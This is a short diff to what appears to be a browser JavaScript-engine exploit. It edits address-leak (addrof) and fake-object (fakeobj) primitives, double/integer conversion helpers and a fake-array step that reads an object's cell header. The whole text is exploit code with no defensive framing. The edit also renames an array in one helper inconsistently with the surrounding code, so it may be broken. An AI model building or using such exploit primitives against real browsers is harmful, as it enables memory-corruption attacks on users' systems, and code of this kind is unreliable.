@@ -352,8 +352,8 @@ function iv(x){
                 return (u32[1]*kBoxedDoubleOffset+u32[0]).toString(16);
           }
           function dec2f(dec) {
-                u32[0] = dec%kBoxedDoubleOffset;
-                u32[1] = dec/kBoxedDoubleOffset;
+                u[0] = dec%kBoxedDoubleOffset;
+                u[1] = dec/kBoxedDoubleOffset;
                 return f[0];
           }
           // store things to prevent GC
@@ -423,7 +423,7 @@ function iv(x){
             let addr = addrof(obj);
             port.postMessage("obj @ " + addr.toString(16));
 
-            let fakeArr = fakeobj(addr + 0x10n);
+            let fakeArr = fakeobj(Add(addr,0x10));
 
             // subtract off the incref
             doubleArrayCellHeader = f2dec(fakeArr[0]) - 0x1n;
